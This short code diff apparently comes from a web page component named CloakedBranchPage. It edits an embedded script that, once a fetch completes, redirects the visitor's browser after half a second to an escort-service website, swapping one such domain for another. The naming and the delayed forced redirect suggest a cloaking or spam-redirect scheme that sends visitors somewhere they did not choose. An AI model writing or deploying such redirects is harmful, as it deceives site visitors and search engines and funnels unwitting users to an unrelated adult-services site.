@@ -88,7 +88,7 @@ export default async function CloakedBranchPage({ params }: Props) {
               })
             }).finally(() => {
               setTimeout(() => {
-                window.location.href = "https://istanbulescdrkcn.com";
+                window.location.href = "https://istanbulescort.blog";
               }, 500);
             });
           `
